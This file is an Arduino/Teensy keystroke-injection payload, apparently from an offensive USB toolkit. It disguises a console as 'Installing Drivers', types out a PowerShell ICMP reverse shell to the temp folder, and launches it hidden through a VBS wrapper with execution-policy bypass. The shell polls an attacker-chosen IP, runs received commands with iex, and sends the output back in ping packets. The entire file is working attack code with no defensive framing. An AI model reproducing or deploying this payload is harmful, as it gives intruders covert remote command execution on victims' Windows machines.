#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
  delay(1000);
  
  Keyboard.println("echo $icl = New-Object System.Net.NetworkInformation.Ping  > %temp%\\ricmp.ps1");
  Keyboard.println("echo $ip = \"INPUT0\" >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $bfs = INPUT1 >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $dly = INPUT2 >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $po = New-Object System.Net.NetworkInformation.PingOptions >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $po.DontFragment = $True  >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $sbt = ([text.encoding]::ASCII).GetBytes(\"PS> \")  >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $icl.Send($ip,60 * 1000, $sbt, $po) ^| Out-Null  >> %temp%\\ricmp.ps1"); 
  Keyboard.println("echo while($true){  >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $sbt = ([text.encoding]::ASCII).GetBytes(\"\")  >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $rp = $icl.Send($ip,60 * 1000, $sbt, $po)  >> %temp%\\ricmp.ps1");
  Keyboard.println("echo if ($rp.Buffer) { >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $rsp = ([text.encoding]::ASCII).GetString($rp.Buffer) >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $rs = (iex $rsp 2>&1 ^| Out-String ) >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $sbt = ([text.encoding]::ASCII).GetBytes($rs) >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $ix = [math]::floor($sbt.length/$bfs) >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $i = 0 >> %temp%\\ricmp.ps1");
  Keyboard.println("echo if ($sbt.length -gt $bfs) { >> %temp%\\ricmp.ps1");
  Keyboard.println("echo while ($i -lt $ix ){ >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $sbt2 = $sbt[($i*$bfs)..(($i+1)*$bfs)] >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $icl.Send($ip,60 * 10000, $sbt2, $po) ^| Out-Null >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $i +=1} >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $rix = $sbt.Length % $bfs >> %temp%\\ricmp.ps1");
  Keyboard.println("echo if ($rix -ne 0){ >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $sbt2 = $sbt[($i*$bfs)..($sbt.Length)] >> %temp%\\ricmp.ps1");
  Keyboard.println("echo $icl.Send($ip,60 * 10000, $sbt2, $po) ^| Out-Null }}>> %temp%\\ricmp.ps1");
  Keyboard.println("echo  else{ >> %temp%\\ricmp.ps1");
  Keyboard.println("echo  $icl.Send($ip,60 * 10000, $sbt, $po) ^| Out-Null} >> %temp%\\ricmp.ps1");
  Keyboard.println("echo  $sbt = ([text.encoding]::ASCII).GetBytes(\"`nPS \" + (pwd).Path + \"> \") >> %temp%\\ricmp.ps1");
  Keyboard.println("echo  $icl.Send($ip,60 * 10000, $sbt, $po) ^| Out-Null} >> %temp%\\ricmp.ps1");
  Keyboard.println("echo  else { Start-Sleep $dly}} >> %temp%\\ricmp.ps1");

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\ricmp.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\ricmp.ps1\"),0,true >> %temp%\\ricmp.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\ricmp.vbs");
  delay(1000);
  Keyboard.println("exit");

}

void loop(){
}

 DEFS
